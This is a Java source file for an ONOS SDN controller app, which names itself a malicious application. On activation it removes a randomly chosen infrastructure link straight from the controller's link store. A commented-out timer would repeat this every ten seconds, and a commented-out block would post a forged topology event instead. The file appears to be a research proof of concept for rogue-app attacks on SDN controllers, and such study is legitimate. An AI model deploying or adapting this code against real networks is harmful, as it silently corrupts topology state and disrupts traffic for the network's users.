/*
 * Copyright 2023-present Open Networking Foundation
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *     http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 * 
 * @author edoardottt, https://edoardottt.com/
 */
package org.linkevent.app;

import org.osgi.service.component.annotations.Activate;
import org.osgi.service.component.annotations.Component;
import org.osgi.service.component.annotations.Deactivate;
import org.osgi.service.component.annotations.Reference;
import org.osgi.service.component.annotations.ReferenceCardinality;
import org.slf4j.Logger;
import org.slf4j.LoggerFactory;
import org.onosproject.core.CoreService;
import org.onosproject.net.DefaultAnnotations;
import org.onosproject.net.device.DeviceService;
import org.onosproject.net.Device;
import org.onosproject.net.host.HostService;
import org.onosproject.net.host.HostStore;
import org.onosproject.net.link.LinkStore;
import org.onosproject.net.link.LinkEvent;
import org.onosproject.net.host.HostEvent;
import org.onosproject.net.Host;
import org.onosproject.net.Link;
import org.onosproject.net.HostId;
import org.onosproject.net.HostLocation;
import org.onosproject.net.DeviceId;
import org.onosproject.core.ApplicationId;
import org.onosproject.net.device.DeviceStore;
import org.onosproject.net.Port;
import org.onosproject.net.ConnectPoint;
import org.onosproject.net.PortNumber;
import org.onosproject.event.EventDeliveryService;
import org.onosproject.net.device.DeviceEvent;
import org.onosproject.event.Event;
import org.onlab.packet.IpAddress;
import org.onosproject.net.packet.PacketEvent;
import org.onosproject.net.packet.DefaultOutboundPacket;
import org.onosproject.net.flow.TrafficTreatment;
import org.onosproject.net.flow.DefaultTrafficTreatment.Builder;
import org.onosproject.net.flow.DefaultTrafficTreatment;
import org.onlab.packet.ARP;
import org.onlab.packet.Ethernet;
import java.nio.ByteBuffer;
import java.util.Timer;
import org.onosproject.net.DefaultHost;
import org.onosproject.net.packet.PacketService;
import java.util.Random;
import java.util.ArrayList;
import java.util.List;
import java.io.StringWriter;
import java.io.PrintWriter;
import org.onlab.packet.VlanId;
import org.onlab.packet.MacAddress;
import org.onosproject.net.provider.ProviderId;
import org.onosproject.net.topology.TopologyEvent;

import java.util.Set;
import java.util.HashSet;
import java.util.TimerTask;

/**
 * LinkEvent Malicious ONOS Application.
 */
@Component(immediate = true)
public class LinkEventApp {

    enum Level {
        LOW,
        MEDIUM,
        HIGH
    }

    private final Logger log = LoggerFactory.getLogger(getClass());

    @Reference(cardinality = ReferenceCardinality.MANDATORY)
    protected CoreService coreService;

    @Reference(cardinality = ReferenceCardinality.MANDATORY)
    protected DeviceService deviceService;

    @Reference(cardinality = ReferenceCardinality.MANDATORY)
    protected DeviceStore deviceStore;

    @Reference(cardinality = ReferenceCardinality.MANDATORY)
    protected LinkStore linkStore;

    @Reference(cardinality = ReferenceCardinality.MANDATORY)
    protected PacketService packetService;

    @Reference(cardinality = ReferenceCardinality.MANDATORY)
    protected HostService hostService;

    @Reference(cardinality = ReferenceCardinality.MANDATORY)
    protected EventDeliveryService eventDispatcher;

    Timer timer = new Timer();
    TimerTask timerTask = new TimerTask() {
        @Override
        public void run() {
            log.info("Time up, running Task!");
            dispatch();
        }
    };

    // --------------------------------------------------------
    // CHANGE THIS PARAMETER TO TRIGGER THE APP EVERY X MILLISECONDS.
    // --------------------------------------------------------
    private static final long TIMEOUT = 10000;

    @Activate
    protected void activate() {
        coreService.registerApplication("org.edoardottt.linkevent.app", () -> log.info("Periscope down."));
        // startTimer(TIMEOUT);
        dispatch();
        log.info("Started linkevent App!");
    }

    @Deactivate
    protected void deactivate() {
        // timer.cancel();
        // timer.purge();
        log.info("Stopped linkevent App!");
    }

    // dispatch event.
    private void dispatch() {
        /*
         * Link l = pickRandomLink();
         * LinkEvent reason = new LinkEvent(LinkEvent.Type.LINK_REMOVED, l);
         * List<Event> reasons = new ArrayList<>();
         * reasons.add(reason);
         * // Topology t = new DefaultTopology(1, );
         * TopologyEvent te = new TopologyEvent(TopologyEvent.Type.TOPOLOGY_CHANGED,
         * null, reasons, 0);
         * eventDispatcher.post(te);
         * log.info(te.toString());
         */

        // directly remove link from LinkStore
        Link l = pickRandomLink();
        ConnectPoint src = l.src();
        ConnectPoint dst = l.dst();
        linkStore.removeLink(src, dst);
        log.info("LINK {} ({}, {}) removed!", l.toString(), src.toString(), dst.toString());
    }

    // startTimer starts a timer that timeouts every X seconds.
    private void startTimer(long timeout) {
        timer.scheduleAtFixedRate(timerTask, 0, timeout);
    }

    // pickRandomDevice picks a random device
    private Device pickRandomDevice() {
        Iterable<Device> devices = deviceService.getDevices();
        Random rand = new Random();
        List<Device> deviceList = new ArrayList<Device>();
        devices.forEach(deviceList::add);
        Device randomDevice = deviceList.get(rand.nextInt(deviceList.size()));

        return randomDevice;
    }

    // pickRandomLink picks a random infrastructure link
    private Link pickRandomLink() {
        Iterable<Link> i = linkStore.getLinks();
        Random rand = new Random();
        List<Link> links = new ArrayList<Link>();
        i.forEach(links::add);
        Link randomLink = links.get(rand.nextInt(links.size()));

        return randomLink;
    }

    // pickRandomPort picks a random port of a device
    private Port pickRandomPort(List<Port> ports) {
        Random rand = new Random();
        Port randomPort = ports.get(rand.nextInt(ports.size()));
        while (randomPort.number() == PortNumber.LOCAL) {
            randomPort = ports.get(rand.nextInt(ports.size()));
        }

        return randomPort;
    }

    // getHost picks a random host
    private Host getHost(int i) {
        Iterable<Host> hosts = hostService.getHosts();
        List<Host> hostList = new ArrayList<Host>();
        hosts.forEach(hostList::add);
        Host randomHost = hostList.get(i);

        return randomHost;
    }
}
